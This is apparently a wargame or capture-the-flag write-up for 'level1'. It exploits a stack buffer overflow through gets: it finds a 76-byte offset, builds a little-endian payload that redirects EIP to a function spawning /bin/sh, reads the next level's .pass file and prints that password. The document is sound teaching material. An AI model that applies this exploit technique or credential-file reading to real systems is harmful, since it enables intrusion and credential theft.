# Level 1 - Buffer Overflow Exploitation

## Vulnerability Identification

Upon analyzing the binary, we discover a critical vulnerability: the program uses the `gets` function, which is inherently unsafe.

According to the manual page, `gets` performs **no check for buffer overrun**, making it a prime target for exploitation.

## Code Structure Analysis

The binary contains two key functions:

### Main Function
Contains the vulnerable `gets` call that reads user input without bounds checking.

### Run Function
This function executes the following operations:
- Writes output using `fwrite`
- Spawns a shell via `system("/bin/sh")`

Our objective is to redirect execution flow to this `run` function.

## Exploitation Strategy

### Target Address

The address of the `run` function is: `0x08048444`

**Note:** This address remains constant because ASLR (Address Space Layout Randomization) is disabled on this system.

### Understanding the EIP

We need to overwrite the **EIP (Extended Instruction Pointer)**, which contains the address of the next instruction to be executed. By controlling the EIP, we can redirect program execution to the `run` function.

## Finding the Offset

### Method 1: Dynamic Analysis with GDB

We determine the exact offset required to reach the EIP:
```bash
python -c 'print "a" * 76 + "B" * 4' > /tmp/exploit
gdb ./level1
r < /tmp/exploit
```

The program crashes with `0x42424242` in the instruction pointer. Since `0x42424242` represents "BBBB" in ASCII, this confirms our offset is **76 bytes**.

### Method 2: Static Analysis with Ghidra

In Ghidra, we can verify this by examining the buffer: the variable `local_50` is defined as `[76]`, confirming our calculation.

## Crafting the Exploit

Now we construct our payload with the correct offset and target address. The address must be written in **little-endian format** (reversed byte order):
```bash
python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit
```

## Handling Non-Interactive Shell Issues

When executing the exploit, the shell spawns but immediately terminates:
```bash
./level1 < /tmp/exploit
```

This occurs because the shell encounters EOF (End of File) in stdin and exits.

### Solution: Keeping the Shell Active

To maintain an interactive shell, we pipe the exploit while keeping stdin open:
```bash
cat /tmp/exploit - | ./level1
```

The `-` argument to `cat` ensures it continues reading from stdin after processing the exploit file, preventing the shell from receiving an immediate EOF.

## Retrieving the Password

With our interactive shell, we can now access the next level's credentials:
```bash
cat /home/user/level2/.pass
```

## Credentials

**Username:** level2  
**Password:** `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`

## Summary

This level demonstrates a classic buffer overflow attack exploiting the unsafe `gets` function. Key concepts covered include:
- Identifying dangerous functions in binary analysis
- Calculating buffer offsets to control the instruction pointer
- Understanding little-endian memory representation
- Maintaining interactive shell sessions after exploitation